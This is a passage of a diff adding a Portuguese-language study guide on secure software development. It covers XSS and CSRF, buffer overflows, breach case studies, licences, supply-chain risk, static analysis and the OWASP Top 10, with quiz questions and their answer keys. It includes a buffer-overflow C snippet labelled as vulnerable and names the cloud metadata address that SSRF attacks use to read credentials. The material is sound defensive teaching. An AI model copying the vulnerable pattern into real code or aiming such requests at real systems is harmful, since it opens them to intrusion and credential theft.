+            <tr><td><strong>Cookie <code>HttpOnly</code></strong></td><td>Impede que o script leia o cookie de sessão.</td></tr>
+            <tr><td><strong>Evitar sinks perigosos</strong></td><td>Não usar <code>innerHTML</code>, <code>eval</code>, <code>document.write</code> com dado não confiável.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha — XSS × CSRF</span>
+        <p>No <strong>XSS</strong>, o script do atacante <em>executa dentro do site</em> vulnerável. No <strong>CSRF</strong> (Cross-Site Request Forgery), nenhum script roda no site: uma página do atacante faz o navegador da vítima <em>enviar</em> uma requisição autenticada (o cookie vai junto automaticamente). Defesas diferentes: XSS → encoding/CSP; CSRF → token anti-CSRF e <code>SameSite</code>. Note também que no Top 10 2021 o XSS deixou de ser categoria própria e passou a fazer parte de <strong>A03 Injection</strong>.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="A">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Um usuário publica num fórum um comentário contendo um <code>&lt;script&gt;</code>. O fórum salva o comentário e, a partir daí, todo visitante que abre o tópico tem seus cookies enviados a um servidor externo. Qual a classificação?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>XSS armazenado (persistente).</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>XSS refletido.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>SQL Injection.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>CSRF.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> O script foi <strong>gravado</strong> e é servido a todos os visitantes: XSS <strong>armazenado</strong> (como o Samy worm). No <em>refletido</em>, o script vem na requisição e não é salvo; <em>SQL Injection</em> ataca o banco, não o navegador; <em>CSRF</em> não executa script no site — força uma requisição a partir de outra página.</div>
+      </div>
+
+      <div class="quiz reveal" data-answer="C">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Uma SPA guarda o JWT no <code>localStorage</code>. A equipe teme que um XSS roube o token. Qual mudança de armazenamento mais reduz esse risco?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>Mover o token para o <code>sessionStorage</code>.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Codificar o token em Base64 antes de salvar.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>Entregar o token num cookie <code>HttpOnly</code>, <code>Secure</code> e <code>SameSite</code>.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Guardar o token numa variável global do JavaScript.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> Um cookie <code>HttpOnly</code> é <strong>inacessível ao JavaScript</strong>, então o script injetado não consegue lê-lo nem enviá-lo para fora. <em>sessionStorage</em> e <em>variável global</em> continuam legíveis por qualquer script da página; <em>Base64</em> é codificação, não criptografia — qualquer um decodifica.</div>
+      </div>
+
+      <h3 id="buffer-overflow">Buffer overflow</h3>
+      <p>Um <span class="lead-term">buffer</span> é uma área de memória de tamanho fixo reservada para guardar um dado (ex.: <code>char nome[16]</code>). O <strong>buffer overflow</strong> (estouro de buffer) acontece quando o programa escreve <strong>mais dados do que o buffer comporta</strong> e o excedente sobrescreve a memória vizinha. Se o atacante controla esse excedente, ele pode sobrescrever o <strong>endereço de retorno</strong> de uma função e desviar a execução para um código dele — execução arbitrária de código. No mínimo, o programa trava (o que já é negação de serviço).</p>
+
+      <pre><code>// C — ✗ VULNERÁVEL: strcpy não verifica o tamanho do destino
+void saudacao(char *input) {
+    char nome[16];
+    strcpy(nome, input);       // input com 200 bytes estoura nome[16]
+}
+
+// ✓ Mais seguro: limitar a cópia ao tamanho do buffer
+snprintf(nome, sizeof(nome), "%s", input);</code></pre>
+
+      <div class="card reveal">
+        <h4>Onde acontece e como se previne</h4>
+        <ul>
+          <li><strong>Onde:</strong> linguagens sem verificação automática de limites de memória — <strong>C e C++</strong>. Em Java, C#, Python, Go e Rust (código seguro), o runtime/compilador impede a escrita fora do limite.</li>
+          <li><strong>Prevenção no código:</strong> validar o tamanho do input (é o "buffer overflow" que a Aula 1 cita em Validação e Sanitização), usar funções com limite (<code>strncpy</code>, <code>snprintf</code>) e análise estática (o <strong>Cppcheck</strong> da Aula 4 detecta esse tipo de erro).</li>
+          <li><strong>Prevenção no sistema operacional/compilador:</strong> <em>stack canaries</em> (valor-sentinela que detecta a sobrescrita), <strong>ASLR</strong> (endereços de memória aleatórios a cada execução) e <strong>DEP/NX</strong> (memória de dados marcada como não executável).</li>
+        </ul>
+      </div>
+
+      <h3 id="casos-famosos">Ataques famosos</h3>
+      <p>Casos citados no material, úteis para reconhecer o tipo de ataque numa questão contextualizada. Os dois detalhados na aula foram Sony PSN (SQLi) e MySpace (XSS).</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Caso</th><th>Ano</th><th>Tipo</th><th>O que aconteceu (segundo o material)</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Sony PlayStation Network</strong></td><td>2011</td><td><span class="pill strat">SQLi</span></td><td>App web sem validação de input; dados pessoais e de cartão de milhões de usuários; detectado só dias depois (19/abr); PSN tirada do ar.</td></tr>
+            <tr><td><strong>MySpace — Samy worm</strong></td><td>2005</td><td><span class="pill tat">XSS</span></td><td>Samy Kamkar injetou JavaScript no próprio perfil; quem visitava virava amigo dele e propagava o script — centenas de milhares de perfis em horas; serviço desativado temporariamente.</td></tr>
+            <tr><td>Yahoo</td><td>2014</td><td><span class="pill strat">SQLi</span></td><td>Dados de mais de 500 milhões de contas.</td></tr>
+            <tr><td>Ashley Madison</td><td>2015</td><td><span class="pill strat">SQLi</span></td><td>Exposição de dados confidenciais de usuários e dano à reputação.</td></tr>
+            <tr><td>TalkTalk</td><td>2015</td><td><span class="pill strat">SQLi</span></td><td>Dados pessoais e financeiros de milhares de clientes.</td></tr>
+            <tr><td>Equifax</td><td>2017</td><td><span class="pill strat">SQLi</span> + outras</td><td>Combinação de vulnerabilidades; mais de 143 milhões de pessoas expostas.</td></tr>
+            <tr><td>Uber</td><td>2016</td><td><span class="pill strat">SQLi</span></td><td>Dados de mais de 50 mil motoristas.</td></tr>
+            <tr><td>Sony Pictures</td><td>2014</td><td><span class="pill tat">XSS</span></td><td>Vazamento de e-mails, dados de funcionários e filmes não lançados.</td></tr>
+            <tr><td>Twitter</td><td>2010</td><td><span class="pill tat">XSS</span></td><td>Worm que postava mensagens automáticas; milhões de usuários afetados.</td></tr>
+            <tr><td>eBay</td><td>2014</td><td><span class="pill tat">XSS</span></td><td>Usuários redirecionados para phishing.</td></tr>
+            <tr><td>WhatsApp Web</td><td>2015</td><td><span class="pill tat">XSS</span></td><td>Acesso a conversas e informações de usuários.</td></tr>
+            <tr><td>Yahoo Finance · BBC</td><td>2017 · 2015</td><td><span class="pill tat">XSS</span></td><td>Redirecionamento para sites maliciosos · exibição de mensagens políticas/ofensivas.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout reveal">
+        <span class="tag">ℹ Ligação com o Top 10</span>
+        <p>No caso <strong>Equifax</strong>, a porta de entrada amplamente documentada foi uma versão desatualizada do framework <strong>Apache Struts</strong> com falha pública já corrigida (CVE-2017-5638) — o exemplo-padrão de <strong>A06:2021 Vulnerable and Outdated Components</strong>. E a PSN ter sido detectada só dias depois ilustra <strong>A09 Security Logging and Monitoring Failures</strong>.</p>
+      </div>
+
+      <!-- ============================================================ AULA 3 ============================================================ -->
+      <h2 id="licencas"><span class="h2-kicker">Aula 3 · Bibliotecas de software</span>Licenças de software</h2>
+      <p>Uma <span class="lead-term">licença de software</span> é o acordo legal que define os direitos e as restrições de uso, modificação e distribuição de um código. Importar uma biblioteca é <strong>aceitar a licença dela</strong> — e isso pode limitar como você distribui ou vende o seu próprio produto. A aula dá três motivos para olhar a licença antes de importar:</p>
+
+      <div class="card reveal">
+        <ul>
+          <li><strong>Compatibilidade de licenças:</strong> a licença da biblioteca precisa ser compatível com a do seu projeto, para não gerar conflito legal.</li>
+          <li><strong>Responsabilidade legal:</strong> usar uma biblioteca em desacordo com a licença viola direitos autorais e expõe o projeto a ações judiciais.</li>
+          <li><strong>Liberdade de uso:</strong> licenças abertas promovem liberdade de uso e modificação; se você precisa proteger propriedade intelectual, escolha bibliotecas cujas licenças não obriguem a abrir o seu código.</li>
+        </ul>
+      </div>
+
+      <p>As licenças abertas se dividem em duas famílias. <strong>Permissivas</strong> deixam você fazer quase tudo, inclusive usar em software fechado, exigindo só que o aviso de autoria seja mantido. <strong>Copyleft</strong> exigem que o software <em>derivado</em> seja distribuído sob a mesma licença — por isso são chamadas de "virais".</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Licença</th><th>Família</th><th>Principal exigência</th><th>Obriga abrir o código do seu produto?</th></tr></thead>
+          <tbody>
+            <tr><td><strong>MIT</strong></td><td><span class="pill ok">Permissiva</span></td><td>Manter o aviso de copyright e o texto da licença. A mais popular e mais simples.</td><td><strong>Não</strong></td></tr>
+            <tr><td><strong>Apache 2.0</strong></td><td><span class="pill ok">Permissiva</span></td><td>Como a MIT, mais <strong>concessão explícita de patentes</strong> dos contribuidores, arquivo <code>NOTICE</code> e indicação de alterações — "protege os contribuintes de responsabilidade legal".</td><td><strong>Não</strong></td></tr>
+            <tr><td><strong>BSD</strong> (2 e 3 cláusulas)</td><td><span class="pill ok">Permissiva</span></td><td>Semelhante à MIT; a versão de 3 cláusulas proíbe usar o nome dos autores para promover o seu produto.</td><td><strong>Não</strong></td></tr>
+            <tr><td><strong>GPL</strong> (GNU General Public License)</td><td><span class="pill strat">Copyleft forte</span></td><td>O software derivado <strong>distribuído</strong> deve ser licenciado também sob a GPL, com código-fonte disponível.</td><td><strong>Sim</strong>, ao distribuir</td></tr>
+            <tr><td>LGPL</td><td><span class="pill warn">Copyleft fraco</span></td><td>Alterações <em>na própria biblioteca</em> devem ser abertas; apenas ligar (linkar) a biblioteca ao seu produto não obriga a abri-lo.</td><td>Só a parte da biblioteca</td></tr>
+            <tr><td>AGPL</td><td><span class="pill strat">Copyleft de rede</span></td><td>Como a GPL, mas o gatilho inclui <strong>disponibilizar o software pela rede</strong> (SaaS).</td><td><strong>Sim</strong>, mesmo como SaaS</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha</span>
+        <p><strong>Código aberto não é domínio público</strong>: o autor continua dono e a licença dita as regras. Um repositório <strong>sem licença</strong> significa "todos os direitos reservados" — legalmente você não pode usá-lo. E a obrigação da GPL é disparada pela <strong>distribuição</strong>: usar uma lib GPL num sistema só interno não obriga a publicar nada; distribuir o produto, sim.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="D">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Uma empresa vende um software desktop de código fechado e quer incorporar uma biblioteca de terceiros. Qual licença da biblioteca <strong>obrigaria</strong> a empresa a distribuir o próprio produto sob a mesma licença, com código-fonte aberto?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>MIT.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Apache 2.0.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>BSD 3 cláusulas.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>GPL.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> A <strong>GPL</strong> é copyleft: o software derivado distribuído deve seguir os termos da GPL. <em>MIT</em>, <em>Apache</em> e <em>BSD</em> são permissivas — exigem manter avisos (e, no caso da Apache, tratam de patentes), mas permitem uso em produto fechado.</div>
+      </div>
+
+      <h3 id="supply-chain">Riscos ao importar bibliotecas (supply chain)</h3>
+      <p>Além da licença, há o risco de <strong>segurança</strong>: a biblioteca pode conter uma vulnerabilidade ou até código malicioso. Como seu app executa o código dela com as mesmas permissões que o seu, uma biblioteca comprometida compromete todos os projetos que a usam. Esse é o chamado ataque à <span class="lead-term">cadeia de suprimentos de software</span> (software supply chain).</p>
+
+      <div class="card reveal">
+        <h4>Caso UA-Parser-JS (2021)</h4>
+        <p>Pacote npm que identifica dispositivo, navegador e sistema operacional a partir do <em>user agent</em> do navegador — cerca de <strong>8 milhões de downloads por semana</strong>. A conta do mantenedor foi comprometida e <strong>três versões</strong> foram publicadas com um <strong>cryptominer</strong> de Monero embutido, com alerta emitido pela CISA. Quem rodou <code>npm install</code> nessas versões instalou o malware sem saber.</p>
+        <p><strong>Cryptominer / cryptojacking:</strong> programa ou script que usa a CPU/GPU de um dispositivo para minerar criptomoedas <strong>sem o consentimento do dono</strong>. O sintoma típico é lentidão e sobrecarga. Infiltra-se por malware, scripts web maliciosos ou apps (e bibliotecas) infectados.</p>
+      </div>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Momento</th><th>Prática recomendada na aula</th></tr></thead>
+          <tbody>
+            <tr><td rowspan="3"><strong>Antes de importar</strong></td><td>Origem confiável: repositórios oficiais de pacotes ou desenvolvedores renomados.</td></tr>
+            <tr><td>Popularidade e comunidade: bibliotecas populares têm mais revisões e auditorias (veja downloads, mantenedores, atividade).</td></tr>
+            <tr><td>Auditoria de código, interna ou por especialistas contratados.</td></tr>
+            <tr><td rowspan="4"><strong>Durante o uso</strong></td><td>Testes de segurança regulares no projeto, incluindo as dependências.</td></tr>
+            <tr><td>Monitorar vulnerabilidades conhecidas das bibliotecas — ex.: <code>npm audit</code> em projetos Node.js.</td></tr>
+            <tr><td>Manter bibliotecas atualizadas para receber correções de segurança.</td></tr>
+            <tr><td>Ferramentas de análise estática de código (Aula 4).</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout reveal">
+        <span class="tag">ℹ Complementos do cânone</span>
+        <p>Fixar versões com <strong>lockfile</strong> (<code>package-lock.json</code>) evita receber automaticamente uma versão maliciosa recém-publicada; um <strong>SBOM</strong> (Software Bill of Materials — a lista de todos os componentes do software) permite saber em minutos se você usa a versão afetada; cuidado com <strong>typosquatting</strong> (pacote com nome parecido, ex.: <code>expres</code> em vez de <code>express</code>). No Top 10, esse tema vira <strong>A06</strong> (componentes vulneráveis) e <strong>A08</strong> (integridade de software).</p>
+      </div>
+
+      <!-- ============================================================ AULA 4 ============================================================ -->
+      <h2 id="manutenibilidade"><span class="h2-kicker">Aula 4 · Análise estática de código</span>Manutenibilidade</h2>
+      <p><span class="lead-term">Manutenibilidade</span> é a capacidade do código-fonte de ser facilmente <strong>compreendido, modificado, corrigido e estendido</strong> ao longo do tempo. Manutenção é inevitável (requisitos mudam, bugs aparecem), então investir em manutenibilidade desde o início economiza tempo e reduz o risco de cada mudança — inclusive o risco de uma correção introduzir uma nova falha de segurança.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Prática</th><th>O que é</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Clareza e legibilidade</strong></td><td>Nomes significativos, comentários explicativos, formatação consistente.</td></tr>
+            <tr><td><strong>Modularização</strong></td><td>Módulos independentes, que se entendem, testam e alteram sem afetar o resto.</td></tr>
+            <tr><td><strong>Testes unitários</strong></td><td>Detectam problemas cedo e garantem que mudanças não introduzam bugs.</td></tr>
+            <tr><td><strong>Gerenciamento de dependências</strong></td><td>Controle rigoroso das bibliotecas para evitar conflitos e incompatibilidades.</td></tr>
+            <tr><td><strong>Padrões de codificação</strong></td><td>Convenções consistentes em toda a equipe.</td></tr>
+            <tr><td><strong>Refatoração</strong></td><td>Eliminar código redundante ou complexo e melhorar a estrutura continuamente.</td></tr>
+            <tr><td><strong>Documentação adequada</strong></td><td>Além dos comentários, documentação externa de arquitetura, fluxos de dados e componentes.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 id="analise-estatica">Análise estática de código &amp; SonarQube</h3>
+      <p>A <span class="lead-term">análise estática</span> é um processo automatizado que examina o código-fonte <strong>sem executá-lo</strong>, procurando erros, vulnerabilidades, problemas de estilo e oportunidades de otimização. É o oposto do <strong>teste dinâmico</strong>, em que o programa roda e é testado em tempo real. Por avaliar o código "em repouso", ela encontra problemas antes de o programa ser executado — portanto, mais cedo e mais barato.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Técnica</th><th>O que examina</th><th>Encontra</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Análise léxica e sintática</strong></td><td>Transforma o código numa representação estruturada (tokens → árvore sintática).</td><td>Erros de formatação e de sintaxe.</td></tr>
+            <tr><td><strong>Análise de fluxo de controle</strong></td><td>Os caminhos de execução possíveis e como os dados passam por eles.</td><td>Código inalcançável, erros de lógica, variável usada sem inicializar.</td></tr>
+            <tr><td><strong>Análise de dependências</strong></td><td>As dependências entre partes do código e com bibliotecas.</td><td>Problemas de integração e de dependência de bibliotecas.</td></tr>
+            <tr><td><strong>Análise de segurança</strong></td><td>Padrões conhecidos de vulnerabilidade (ex.: input do usuário que chega a uma query sem parametrização).</td><td>SQL Injection, XSS e outras.</td></tr>
+            <tr><td><strong>Análise de estilo</strong></td><td>Conformidade com as diretrizes de codificação.</td><td>Formatação, nomes de variáveis, más práticas da linguagem.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Ferramenta</th><th>Linguagem</th><th>Foco</th></tr></thead>
+          <tbody>
+            <tr><td><strong>ESLint</strong></td><td>JavaScript</td><td>Estilo, erros de sintaxe e até vulnerabilidades (com plugins).</td></tr>
+            <tr><td><strong>Pylint</strong></td><td>Python</td><td>Erros, estilo e diretrizes de codificação.</td></tr>
+            <tr><td><strong>RuboCop</strong></td><td>Ruby</td><td>Estilo e erros comuns.</td></tr>
+            <tr><td><strong>Checkstyle</strong></td><td>Java</td><td><strong>Estilo</strong>, seguindo as convenções Java.</td></tr>
+            <tr><td><strong>Cppcheck</strong></td><td>C/C++</td><td>Erros de programação, <strong>vazamentos de memória</strong>, estilo.</td></tr>
+            <tr><td><strong>SonarQube</strong></td><td><strong>Multilinguagem</strong> (Java, C#, JS, Python…)</td><td>Plataforma completa de qualidade e segurança, integrada a CI/CD.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="card reveal">
+        <h4>SonarQube — o que ele mostra e como entra no pipeline</h4>
+        <ul>
+          <li><strong>Bugs:</strong> código que provavelmente se comporta errado.</li>
+          <li><strong>Vulnerabilities:</strong> falhas de segurança confirmadas pelo padrão (ex.: SQL concatenado).</li>
+          <li><strong>Security Hotspots:</strong> trechos sensíveis que <em>precisam de revisão humana</em> para decidir se são falha.</li>
+          <li><strong>Code Smells:</strong> problemas de manutenibilidade (complexidade, duplicação) — somam a <strong>dívida técnica</strong>.</li>
+          <li><strong>Cobertura de testes e duplicação</strong> de código.</li>
+          <li><strong>Quality Gate:</strong> conjunto de condições (ex.: cobertura ≥ 80% no código novo, zero vulnerabilidades novas). Se o código não passa, o pipeline de CI <strong>falha</strong> e o merge é barrado.</li>
+          <li><strong>No pipeline:</strong> o job de CI roda os testes, gera o relatório de cobertura e executa o <em>SonarScanner</em>, que envia a análise ao servidor SonarQube (ou ao SonarCloud, a versão SaaS).</li>
+        </ul>
+      </div>
+
+      <div class="callout warn reveal">
+        <span class="tag">⚠ Pegadinha</span>
+        <p>O SonarQube <strong>não executa</strong> o seu código. A <strong>cobertura</strong> que ele mostra vem de um relatório gerado <em>pelos testes</em> (que rodaram antes, no pipeline) e importado por ele. Também não substitui o teste dinâmico: problemas que só aparecem em execução (configuração do servidor, autenticação em runtime) exigem DAST.</p>
+      </div>
+
+      <div class="quiz reveal" data-answer="C">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Sobre a análise estática de código, assinale a alternativa <strong>correta</strong>.</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>Ela executa o programa com entradas maliciosas para observar seu comportamento.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>Ela só pode ser feita manualmente, por revisão de pares.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>Ela examina o código-fonte sem executá-lo e pode ser automatizada num pipeline de CI/CD, como no SonarQube.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Ela dispensa testes unitários, porque calcula a cobertura sozinha.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> Estática = <strong>sem executar</strong>, e é justamente o tipo de verificação automatizável no pipeline. Executar com entradas maliciosas é teste <em>dinâmico</em> (DAST); ela é feita por ferramentas, não só manualmente; e a cobertura depende dos testes, que continuam necessários.</div>
+      </div>
+
+      <h3 id="sast-dast-sca">SAST × DAST × SCA</h3>
+      <p>As ferramentas das Aulas 3, 4 e 5 se encaixam em três categorias de teste de segurança. Essa classificação é o que distingue, numa questão, o SonarQube do ZAP e do Dependency-Track.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Sigla</th><th>Nome</th><th>Analisa</th><th>Executa o app?</th><th>Visão</th><th>Exemplos</th></tr></thead>
+          <tbody>
+            <tr><td><strong>SAST</strong></td><td>Static Application Security Testing</td><td>O <strong>código-fonte</strong> próprio</td><td><strong>Não</strong></td><td>Caixa-branca (vê o código)</td><td>SonarQube, ESLint com plugins de segurança, Semgrep</td></tr>
+            <tr><td><strong>DAST</strong></td><td>Dynamic Application Security Testing</td><td>O app <strong>rodando</strong>, atacado por fora via HTTP</td><td><strong>Sim</strong></td><td>Caixa-preta (não vê o código)</td><td><strong>OWASP ZAP</strong>, Burp Suite</td></tr>
+            <tr><td><strong>SCA</strong></td><td>Software Composition Analysis</td><td>As <strong>dependências</strong> de terceiros e suas versões</td><td>Não</td><td>Inventário de componentes</td><td><strong>OWASP Dependency-Track</strong>, <code>npm audit</code>, Dependabot</td></tr>
+            <tr><td>IAST</td><td>Interactive AST</td><td>O app rodando, com um agente instrumentado dentro dele</td><td>Sim</td><td>Híbrida</td><td>Contrast Security</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="quiz reveal" data-answer="B">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Uma equipe sobe a aplicação num ambiente de homologação e aponta o OWASP ZAP para a URL, que navega pelas páginas e envia requisições maliciosas para encontrar falhas. Que tipo de teste é esse?</p>
+        <ul class="options">
+          <li class="opt" data-key="A"><span class="marker">A</span><span>SAST — análise estática do código-fonte.</span></li>
+          <li class="opt" data-key="B"><span class="marker">B</span><span>DAST — teste dinâmico da aplicação em execução.</span></li>
+          <li class="opt" data-key="C"><span class="marker">C</span><span>SCA — análise das dependências de terceiros.</span></li>
+          <li class="opt" data-key="D"><span class="marker">D</span><span>Análise de estilo de código.</span></li>
+        </ul>
+        <div class="explain"><span class="verdict"></span> O ZAP ataca a aplicação <strong>rodando</strong>, por fora, sem olhar o código: é <strong>DAST</strong>. <em>SAST</em> lê o código sem executar (SonarQube); <em>SCA</em> inventaria bibliotecas e suas CVEs (Dependency-Track, <code>npm audit</code>); <em>estilo</em> é uma das técnicas da análise estática.</div>
+      </div>
+
+      <!-- ============================================================ AULA 5 ============================================================ -->
+      <h2 id="owasp"><span class="h2-kicker">Aula 5 · OWASP</span>O que é a OWASP</h2>
+      <p>A <span class="lead-term">OWASP</span> é uma fundação <strong>sem fins lucrativos</strong>, aberta e mantida pela comunidade, que promove práticas de segurança de software e melhora a segurança de aplicações web no mundo todo. O nome era <em>Open Web Application Security Project</em>; desde 2023 é <em>Open <strong>Worldwide</strong> Application Security Project</em> (mesma sigla). Funciona por <strong>capítulos</strong> locais, treinamentos, meetups e, principalmente, <strong>projetos</strong> gratuitos e abertos.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>Projeto</th><th>Tipo</th><th>Para que serve</th></tr></thead>
+          <tbody>
+            <tr><td><strong>OWASP Top 10</strong></td><td>Documento de conscientização</td><td>As 10 categorias de risco mais críticas em aplicações web. O projeto principal.</td></tr>
+            <tr><td><strong>Dependency-Track</strong></td><td>Plataforma (SCA)</td><td>Gestão contínua do risco das dependências de um projeto.</td></tr>
+            <tr><td><strong>Juice Shop</strong></td><td>App propositalmente vulnerável</td><td>Treino prático em um e-commerce inseguro e realista.</td></tr>
+            <tr><td><strong>WebGoat</strong></td><td>App propositalmente vulnerável</td><td>Treino guiado por lições, uma vulnerabilidade por vez.</td></tr>
+            <tr><td><strong>Web Security Testing Guide (WSTG)</strong></td><td>Guia / metodologia</td><td>Como <em>testar</em> a segurança de uma aplicação web, área por área.</td></tr>
+            <tr><td><strong>ZAP</strong> (Zed Attack Proxy)</td><td>Ferramenta (DAST)</td><td>Encontrar vulnerabilidades atacando a aplicação em execução — usada no hands-on.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 id="top10-2021">OWASP Top 10 · 2021</h3>
+      <p>O <span class="lead-term">OWASP Top 10</span> é um documento de conscientização com as 10 <strong>categorias</strong> de risco mais críticas para aplicações web, montado a partir de dados de testes reais contribuídos por empresas e de uma pesquisa com a comunidade. Ter o código preparado contra elas é considerado boa prática de mercado. Cada categoria agrupa várias fraquezas catalogadas como <strong>CWE</strong> (Common Weakness Enumeration, o catálogo padrão de tipos de falha). A sigla <strong>A01…A10</strong> indica a posição; a edição de 2021 é a que a aula usa.</p>
+
+      <div class="table-wrap reveal">
+        <table>
+          <thead><tr><th>#</th><th>Categoria (nome oficial)</th><th>Em português</th><th>Exemplo típico</th><th>Prevenção principal</th></tr></thead>
+          <tbody>
+            <tr><td><strong>A01</strong></td><td>Broken Access Control</td><td>Quebra de controle de acesso</td><td>Trocar <code>/pedidos/123</code> por <code>/pedidos/124</code> e ver o pedido de outro cliente (IDOR); usuário comum acessando rota de admin.</td><td>Negar por padrão; checar permissão e <strong>propriedade do recurso</strong> no servidor, em toda requisição.</td></tr>
+            <tr><td><strong>A02</strong></td><td>Cryptographic Failures</td><td>Falhas criptográficas</td><td>Senha guardada em MD5/SHA-1 ou texto puro; dados sensíveis por HTTP; chave fixa no código.</td><td>TLS em tudo; hash de senha com bcrypt/Argon2; algoritmos fortes; chaves num cofre (KMS).</td></tr>
+            <tr><td><strong>A03</strong></td><td>Injection</td><td>Injeção (inclui XSS)</td><td>SQL, NoSQL, comando de SO, LDAP, XSS.</td><td>Queries parametrizadas; validação por allowlist; output encoding.</td></tr>
+            <tr><td><strong>A04</strong></td><td>Insecure Design</td><td>Design inseguro</td><td>Recuperação de senha por "pergunta secreta"; fluxo de compra sem limite que permite reservar todo o estoque.</td><td>Modelagem de ameaças, padrões de design seguro, casos de abuso já no design.</td></tr>
+            <tr><td><strong>A05</strong></td><td>Security Misconfiguration</td><td>Configuração de segurança incorreta (inclui XXE)</td><td>Senha padrão de fábrica; stack trace exibido ao usuário; bucket S3 público; recursos desnecessários ligados.</td><td>Hardening, configuração automatizada e repetível, plataforma mínima.</td></tr>
+            <tr><td><strong>A06</strong></td><td>Vulnerable and Outdated Components</td><td>Componentes vulneráveis e desatualizados</td><td>Biblioteca com CVE conhecida (Log4Shell, Struts/Equifax).</td><td>SCA (Dependency-Track), SBOM, atualização contínua.</td></tr>
+            <tr><td><strong>A07</strong></td><td>Identification and Authentication Failures</td><td>Falhas de identificação e autenticação</td><td>Permitir força bruta; senhas fracas; não trocar o ID de sessão no login (session fixation); sem MFA.</td><td>MFA, rate limiting, novo ID de sessão no login, política de senha.</td></tr>
+            <tr><td><strong>A08</strong></td><td>Software and Data Integrity Failures</td><td>Falhas de integridade de software e dados</td><td>Atualização sem assinatura; pipeline CI/CD inseguro; desserialização insegura; script de CDN sem verificação.</td><td>Assinatura digital, verificação de integridade (SRI), pipeline protegido.</td></tr>
+            <tr><td><strong>A09</strong></td><td>Security Logging and Monitoring Failures</td><td>Falhas de log e monitoramento de segurança</td><td>Falhas de login não registradas; ninguém é alertado; invasão descoberta meses depois.</td><td>Registrar eventos de segurança, centralizar logs, alertas, plano de resposta a incidentes.</td></tr>
+            <tr><td><strong>A10</strong></td><td>Server-Side Request Forgery (SSRF)</td><td>Falsificação de requisição do lado do servidor</td><td>A app busca uma URL informada pelo usuário; o atacante informa <code>http://169.254.169.254/</code> e lê as credenciais da instância na nuvem.</td><td>Allowlist de destinos, bloquear IPs internos, segmentação de rede, IMDSv2 na AWS.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="mnemonic">
+        <div class="m-head">Mnemônico — OWASP Top 10 · 2021, na ordem</div>
+        <div class="m-word">"<b>A</b>cessei <b>C</b>ripto <b>I</b>njetada, <b>D</b>esenhei <b>M</b>al; <b>V</b>ersões <b>A</b>ntigas <b>I</b>nfectaram <b>L</b>ogs do <b>S</b>ervidor"</div>
+        <ul>
+          <li><b>A</b> → A01 <strong>A</strong>ccess Control (Broken)</li>
+          <li><b>C</b> → A02 <strong>C</strong>ryptographic Failures</li>
+          <li><b>I</b> → A03 <strong>I</strong>njection</li>
+          <li><b>D</b> → A04 Insecure <strong>D</strong>esign</li>
+          <li><b>M</b> → A05 Security <strong>M</strong>isconfiguration</li>
+          <li><b>V</b> → A06 <strong>V</strong>ulnerable and Outdated Components</li>
+          <li><b>A</b> → A07 Identification and <strong>A</strong>uthentication Failures</li>
+          <li><b>I</b> → A08 Software and Data <strong>I</strong>ntegrity Failures</li>
+          <li><b>L</b> → A09 Security <strong>L</strong>ogging and Monitoring Failures</li>
+          <li><b>S</b> → A10 <strong>S</strong>SRF</li>
+        </ul>
+      </div>
+
+      <div class="quiz reveal" data-answer="A">
+        <span class="quiz-label">Questão</span>
+        <p class="q-text">Logado como cliente, um usuário altera a URL de <code>/api/faturas/1001</code> para <code>/api/faturas/1002</code> e recebe a fatura de outro cliente. Em qual categoria do OWASP Top 10 2021 isso se enquadra?</p>
+        <ul class="options">
